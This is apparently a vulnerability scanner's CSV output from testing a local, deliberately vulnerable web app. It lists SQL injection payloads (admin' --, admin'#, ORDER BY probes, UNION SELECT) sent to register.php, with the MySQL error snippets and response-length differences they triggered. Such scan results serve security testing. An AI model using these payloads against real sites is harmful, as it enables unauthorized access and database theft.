target,type,detail
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin' --"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""admin' --"", ""len"": 533, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin' --"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'#"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'#"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin'#"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""admin'/*"", ""len"": 538, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin'/*"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 1--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 2--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 2--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 3--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 3--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""len"": 572, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT NULL--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT NULL--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' UNION SELECT NULL--"", ""len"": 568, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' UNION SELECT NULL--"", ""score"": 0.0}"
